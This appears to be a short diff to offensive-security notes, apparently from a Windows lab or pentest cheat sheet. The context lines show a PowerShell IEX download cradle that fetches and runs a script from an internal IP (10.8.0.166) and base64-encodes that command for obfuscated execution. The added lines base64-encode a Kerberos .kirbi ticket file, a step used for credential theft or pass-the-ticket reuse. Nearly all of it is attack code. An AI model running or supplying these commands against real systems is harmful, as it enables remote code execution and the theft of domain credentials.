@@ -26,3 +26,6 @@ $command = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.166:80
 $bytes = [Text.Encoding]::Unicode.GetBytes($command)
 $encodedCommand = [Convert]::ToBase64String($bytes)
   ```
+  ```
+   [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\x64\MeMe.kirbi"))
+   ```
